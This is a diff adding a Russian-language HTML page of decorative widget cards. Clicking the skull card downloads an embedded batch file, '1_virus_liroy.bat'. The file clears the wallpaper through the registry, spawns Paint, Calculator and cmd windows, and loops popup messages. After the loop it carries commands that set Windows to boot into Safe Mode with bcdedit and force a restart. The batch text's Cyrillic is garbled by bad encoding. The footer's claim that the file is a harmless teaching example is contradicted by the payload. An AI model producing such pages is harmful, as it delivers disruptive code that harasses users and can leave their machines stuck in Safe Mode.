@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Виджеты | стильные карточки</title>
+    <!-- Google Fonts & Font Awesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e9ecf2 100%);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .header h1 {
+            font-weight: 600;
+            font-size: 2.5rem;
+            color: #1e293b;
+            letter-spacing: -0.5px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .header p {
+            color: #475569;
+            font-size: 1.1rem;
+            margin-top: 8px;
+        }
+
+        .widget-container {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+            justify-content: center;
+            max-width: 1000px;
+        }
+
+        .widget {
+            width: 240px;
+            background: rgba(255, 255, 255, 0.75);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            border-radius: 32px;
+            padding: 30px 20px 25px;
+            box-shadow: 0 20px 35px -8px rgba(0, 0, 0, 0.15), 
+                        0 0 0 1px rgba(255, 255, 255, 0.5) inset;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            transition: transform 0.25s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+            color: #0f172a;
+        }
+
+        .widget:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.25), 
+                        0 0 0 1px rgba(255, 255, 255, 0.8) inset;
+            background: rgba(255, 255, 255, 0.85);
+        }
+
+        .widget:active {
+            transform: scale(0.97);
+        }
+
+        /* Индивидуальный стиль для виджета-вируса (лёгкий красноватый оттенок) */
+        .widget.virus {
+            background: rgba(255, 240, 240, 0.8);
+            border-color: rgba(255, 180, 180, 0.6);
+        }
+
+        .widget.virus:hover {
+            background: rgba(255, 230, 230, 0.9);
+        }
+
+        .widget i {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            color: #2c3e50;
+        }
+
+        .widget.virus i {
+            color: #c0392b;
+        }
+
+        .widget span {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .widget .description {
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        .footer-note {
+            margin-top: 50px;
+            color: #64748b;
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(100, 116, 139, 0.2);
+            padding-top: 20px;
+            width: 100%;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>✨ Виджеты</h1>
+        <p>Нажми на карточку — получишь сюрприз</p>
+    </div>
+
+    <div class="widget-container">
+        <!-- Обычный виджет 1 -->
+        <div class="widget" id="widget1">
+            <i class="fas fa-star"></i>
+            <span>Просто виджет</span>
+            <div class="description">Здесь ничего не происходит</div>
+        </div>
+        <!-- Обычный виджет 2 -->
+        <div class="widget" id="widget2">
+            <i class="fas fa-smile"></i>
+            <span>Ещё один</span>
+            <div class="description">Тоже бездействует</div>
+        </div>
+        <!-- Виджет с вирусом (скачивание файла) -->
+        <div class="widget virus" id="virusWidget">
+            <i class="fas fa-skull"></i>
+            <span>1 вирус liroy</span>
+            <div class="description">Нажми, если хочешь приключений</div>
+        </div>
+    </div>
+
+    <div class="footer-note">
+        <i class="fas fa-shield-alt"></i> только учебный пример, файл неопасен
+    </div>
+
+    <script>
+        (function() {
+            // Полное содержимое liroy.bat (из вопроса)
+            const batContent = `@echo off
+title 啸袗啸袗啸袗啸袗啸袗啸袗袗啸袗啸袗啸啸袗啸袗啸袗啸袗啸袗啸袗
+color 0A
+echo.
+echo 袙袧袠袦袗袧袠袝! 袣芯屑锌褜褞褌械褉 谐芯褌芯胁懈褌褋褟 泻 "锌芯谢芯屑泻械"...
+ping -n 3 127.0.0.1 >nul
+
+:: --- 1. 袣芯褋屑械褌懈泻邪 (锌褍谐邪械屑 芯斜芯褟屑懈) ---
+echo 袦械薪褟械屑 褎芯薪 薪邪 褔械褉薪褘泄...
+reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1
+
+:: --- 2. 袨褌泻褉褘胁邪械屑 泻褍褔褍 胁褋械谐芯 (褉邪蟹写褉邪卸邪械屑) ---
+echo 袨褌泻褉褘胁邪械屑 锌褉懈谢芯卸械薪懈褟 写谢褟 胁械褋械谢褜褟...
+start mspaint
+start calc
+start cmd
+start cmd
+start cmd
+
+:: --- 3. 笑懈泻谢 褋芯芯斜褖械薪懈泄 (锌褍谐邪械屑 褌械泻褋褌芯屑) ---
+echo 袟邪锌褍褋泻邪械屑 锌褋懈褏芯谢芯谐懈褔械褋泻褍褞 邪褌邪泻褍...
+:loop
+msg * 孝褘 褍胁械褉械薪, 褔褌芯 褝褌芯 褌械锌械褉褜 褌胁芯泄 泻芯屑锌褜褞褌械褉?
+msg * 袣邪卸械褌褋褟, 褟 褔褌芯-褌芯 褋谢芯屑邪谢...
+ping -n 2 127.0.0.1 >nul
+goto loop
+
+:: 协褌芯褌 泻芯写 薪懈卸械 薪械 胁褘锌芯谢薪懈褌褋褟 懈蟹-蟹邪 胁械褔薪芯谐芯 褑懈泻谢邪 胁褘褕械,
+:: 薪芯 械褋谢懈 褍斜褉邪褌褜 loop, 褌芯 褋褉邪斜芯褌邪械褌 胁芯褌 褝褌芯:
+
+:: --- 4. 袚袥袗袙袧袗携 肖袠楔袣袗: 袙泻谢褞褔邪械屑 斜械蟹芯锌邪褋薪褘泄 褉械卸懈屑 薪邪胁褋械谐写邪 ---
+:: 袛谢褟 胁褘锌芯谢薪械薪懈褟 褝褌懈褏 泻芯屑邪薪写 薪褍卸薪褘 锌褉邪胁邪 邪写屑懈薪邪.
+:: 袨薪懈 谐芯胁芯褉褟褌 Windows: "袩褉懈 褋谢械写褍褞褖械屑 蟹邪谐褉褍蟹泻械 谐褉褍蟹懈褋褜 胁 Safe Mode"
+
+echo.
+echo [小械泻褉械褌薪芯] 袗泻褌懈胁懈褉褍褞 褉械卸懈屑 写懈邪谐薪芯褋褌懈泻懈...
+
+:: 袩褘褌邪械屑褋褟 胁泻谢褞褔懈褌褜 斜械蟹芯锌邪褋薪褘泄 褉械卸懈屑 (屑懈薪懈屑邪谢褜薪褘泄)
+bcdedit /set {default} safeboot minimal >nul 2>&1
+
+:: 袝褋谢懈 薪械 褋褉邪斜芯褌邪谢芯, 锌褉芯斜褍械屑 褔械褉械蟹 current
+bcdedit /set {current} safeboot minimal >nul 2>&1
+
+echo 袚芯褌芯胁芯! 袩械褉械蟹邪谐褉褍蟹泻邪 褔械褉械蟹 10 褋械泻褍薪写...
+shutdown /r /t 10 /c "袣芯屑锌褜褞褌械褉 褍褏芯写懈褌 薪邪 写懈邪谐薪芯褋褌懈泻褍. 袧械 胁褘泻谢褞褔邪泄褌械!"
+
+:: 袣芯薪械褑 褎邪泄谢邪`;
+
+            // Функция скачивания файла
+            function downloadVirus() {
+                const blob = new Blob([batContent], { type: 'application/octet-stream' });
+                const fileName = '1_virus_liroy.bat';
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = fileName;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(link.href);
+            }
+
+            // Назначаем обработчик на виджет с id="virusWidget"
+            const virusWidget = document.getElementById('virusWidget');
+            if (virusWidget) {
+                virusWidget.addEventListener('click', downloadVirus);
+            }
+
+            // Для остальных виджетов можно добавить какое-либо уведомление (по желанию)
+            const widget1 = document.getElementById('widget1');
+            const widget2 = document.getElementById('widget2');
+            if (widget1) {
+                widget1.addEventListener('click', () => {
+                    alert('Это обычный виджет. Попробуй нажать на красный!');
+                });
+            }
+            if (widget2) {
+                widget2.addEventListener('click', () => {
+                    alert('Скучно? Жми на череп!');
+                });
+            }
+        })();
+    </script>
+</body>
+</html>
